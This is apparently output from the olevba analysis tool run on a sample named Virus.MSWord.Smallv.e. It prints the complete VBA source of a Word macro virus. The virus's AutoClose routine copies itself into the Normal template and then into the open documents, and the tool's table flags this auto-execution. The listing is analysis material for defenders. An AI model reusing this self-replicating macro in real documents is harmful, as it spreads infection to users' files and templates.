olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Smallv.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Smallv.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Smallv.e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function CopyMac(src, Tgt) As Long
On Error GoTo EndCopyMac
Application.OrganizerCopy _
   Source:=src, _
   Destination:=Tgt, _
   Name:="AutoClose", _
   Object:=wdOrganizerObjectProjectItems
EndCopyMac:
CopyMac = Err.Number
On Error GoTo 0
End Function
Sub MAIN()
ret = CopyMac(ActiveDocument.FullName, NormalTemplate.FullName)
If (ret = 5940) Then
    ret = CopyMac(NormalTemplate.FullName, ActiveDocument.FullName)
  If (ret = 0) Then
     ActiveDocument.SaveAs _
        FileName:=ActiveDocument.FullName, _
        FileFormat:=wdFormatTemplate
  End If
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

